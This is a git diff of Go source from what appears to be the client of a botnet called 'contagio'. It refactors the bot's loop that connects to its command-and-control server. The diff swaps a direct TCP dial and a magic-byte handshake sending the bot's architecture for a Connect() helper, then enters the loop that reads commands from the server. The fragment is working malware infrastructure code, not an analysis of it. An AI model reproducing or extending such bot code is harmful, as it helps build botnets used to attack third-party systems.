@@ -5,7 +5,6 @@ import (
 	"contagio/bot/config"
 	"contagio/bot/methods"
 	"fmt"
-	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -108,21 +107,15 @@ func main() {
 	Bot = initbot()
 
 CONNECT:
-
-	connection, err := net.Dial("tcp", config.BOT_SERVER+":"+config.BOT_PORT)
-
-	if err != nil {
-		if config.DEBUG {
-			fmt.Println("Can't connect to the bot server: " + err.Error())
-		}
+	connection, err := Connect()
+	if err != nil || connection == nil {
 		time.Sleep(1 * time.Second)
 		goto CONNECT
 	}
 
-	connection.Write([]byte{0, 0, 0, 30, 59, 10, 33, 10, 1, 1, 1, 5, 0, 0, 0, 0})
-
-	connection.Write([]byte(Bot.Arch))
-
+	if config.DEBUG {
+		fmt.Println("[main] Connected to bot server!")
+	}
 	for {
 
 		command := make([]byte, 2000)
